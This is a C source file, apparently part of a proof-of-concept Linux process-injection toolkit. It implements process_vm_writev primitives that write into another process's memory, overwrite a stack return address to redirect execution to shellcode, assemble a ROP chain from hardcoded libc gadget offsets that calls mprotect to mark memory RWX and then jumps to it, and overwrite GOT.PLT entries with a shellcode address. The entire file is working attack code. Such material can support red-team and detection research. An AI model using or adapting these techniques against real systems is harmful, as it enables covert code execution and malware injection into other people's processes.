#include "proc_vm_writev_primitives.h"


/*
  Write a payload to a specified process at a given offset using the process_vm_writev syscall.
   
  - address: The memory address to write to. Used as the offset in the mem file when writing.
  - pid: The pid of the injected process.
  - data: A pointer to the data to be copied into the process. 
  - data_len: the length of the data to be copied.
*/
int process_vm_writev_write(long pid, long address, void *data, int data_len)
{
    // Initialize local and remote iovec structs used to perform the syscall
    struct iovec local[1];
    struct iovec remote[1];
    
    // Point the local iovec to our data
    local[0].iov_base = data;
    local[0].iov_len = data_len;
    
    // Point the remote iovec to the address of our writeable memory region
    remote[0].iov_base = (void *) address;
    remote[0].iov_len = data_len;
    
    // Write the local data to the remote address
    process_vm_writev(pid, local, 1, remote, 1, 0);

    return 0;
}


/*
  Gain execution in a remote process by overwriting a return address on the process stack.
   
  - address: The memory address to overwrite the return address with. The address should contain the shellcode to be executed.
  - pid: The pid of the injected process.
*/
int process_vm_writev_stack_overwrite_exec(long pid, long address)
{
    // get process stack pointer from syscall file
    long stack_pointer = procfs_get_stack_pointer(pid);
    
    // get process text section range from maps file. the first r-x section mapped should be the text section.
    long text_section_start = procfs_find_executable_region_start_address(pid);
    long text_section_end = procfs_find_executable_region_end_address(pid);
    
    // Calculate the size of the region
    long text_section_size = text_section_end - text_section_start;
    
    // identify a return address on the stack by scanning it and looking for a value inside the region we previously identified
    long stack_ret_address = procfs_get_stack_return_address(stack_pointer, pid, text_section_start, text_section_size);
    
    // overwrite with pointer to our payload
    process_vm_writev_write(pid, stack_ret_address, &address, sizeof(long));
    
    return 0;

}


/*
  Gain execution in a remote process by overwriting a return address on the process stack and injecting a ROP chain.
  The ROP chain in this example makes the provided memory address executable using mprotect and then jumps to it.
  This POC uses hardcoded gadget addresses! to make it work on your machine, identify the gadget addresses and replace in the code.
  
  - pid: The pid of the injected process.
  - address: The memory address to overwrite the return address with. The address should contain the shellcode to be executed.
  - libc_base: The memory address of the libc library in the target process memory. Used to calculate the gadget addresses.
*/
int process_vm_writev_stack_overwrite_rop(long pid, long address, long libc_base)
{
    // get process stack pointer from syscall file
    long stack_pointer = procfs_get_stack_pointer(pid);
    
    // get process text section range from maps file. the first r-x section mapped should be the text section.
    long text_section_start = procfs_find_executable_region_start_address(pid);
    long text_section_end = procfs_find_executable_region_end_address(pid);
    
    // Calculate the size of the region
    long text_section_size = text_section_end - text_section_start;
    
    // identify a return address on the stack by scanning it and looking for a value inside the region we previously identified
    long stack_ret_address = procfs_get_stack_return_address(stack_pointer, pid, text_section_start, text_section_size);
    
    // addresses of gadgets found in libc.
    long pop_rax = libc_base + 0x000000000003f587;
    long pop_rdi = libc_base + 0x0000000000027c65;
    long pop_rsi = libc_base + 0x0000000000029419;
    long pop_rdx = libc_base + 0x00000000000fd76d;
    long syscall = libc_base + 0x0000000000085422;
    
     
    long mprotect_syscall_num = 10; // 10 is the syscall number of mprotect
    long region_size = 0x1000; // Change this to the size of your shellcode if necassary
    long prot_rwx = 7; // 7 stands for RWX permissions
    
    // POP RDI 
    // address -> RDI 
    // first argument of mprotect is the address to modify
    process_vm_writev_write(pid, stack_ret_address, &pop_rdi, sizeof(long));
    stack_ret_address += sizeof(long);
    
    process_vm_writev_write(pid, stack_ret_address, &address, sizeof(long));
    stack_ret_address += sizeof(long);
    
 
    // POP RSI 
    // region_size -> RSI
    // second argument of mprotect is the size of the region to modify
    process_vm_writev_write(pid, stack_ret_address, &pop_rsi, sizeof(long));
    stack_ret_address += sizeof(long);
  
    process_vm_writev_write(pid, stack_ret_address, &region_size, sizeof(long));
    stack_ret_address += sizeof(long);
    
    
    // POP RDX 
    // prot_rwx -> RDX
    // third argument of mprotect is the premissions mask
    process_vm_writev_write(pid, stack_ret_address, &pop_rdx, sizeof(long));
    stack_ret_address += sizeof(long);

    process_vm_writev_write(pid, stack_ret_address, &prot_rwx, sizeof(long));
    stack_ret_address += sizeof(long);
    
    
    // POP RAX
    // 10 -> RAX 
    // put the mprotect syscall num into RAX
    process_vm_writev_write(pid, stack_ret_address, &pop_rax, sizeof(long));
    stack_ret_address += sizeof(long);

    process_vm_writev_write(pid, stack_ret_address, &mprotect_syscall_num, sizeof(long));
    stack_ret_address += sizeof(long);
    
    // SYSCALL 
    // perform the mprotect syscall
    process_vm_writev_write(pid, stack_ret_address, &syscall, sizeof(long));
    stack_ret_address += sizeof(long);
    
    // write the address of our shellcode at the end of the chain
    // after making the region executable, we jump to it
    process_vm_writev_write(pid, stack_ret_address, &address, sizeof(long));

    return 0;

}

/*
  Gain execution in a remote process by overwriting the got.plt section with addresses of our shellcode.
  This is a demo that overwrites an arbitrary number of addresses in the section, a better implementation will target specific functions.
   
  - address: Overwrite pointers inside the got.plt section with this address. The address should contain the shellcode to be executed.
  - pid: The pid of the injected process.
*/
int process_vm_writev_got_overwrite_exec(long pid, long address)
{
    // locate the first rw region in the process - this section should hold the got.plt section.
    // this is a very lazy implementation for the sake of this POC. 
    // A better approach would be to parse the ELF headers to locate the section.
    long plt_address = procfs_find_write_region_start_address(pid);
    
    // overwrite the first 100 pointers in the got.plt section with our shellcode address
    long i = 0;
    while (i<100)
    {
    	process_vm_writev_write(pid, plt_address+i, &address, sizeof(long));
    	i += sizeof(long);
    }
    
    return 0;

}
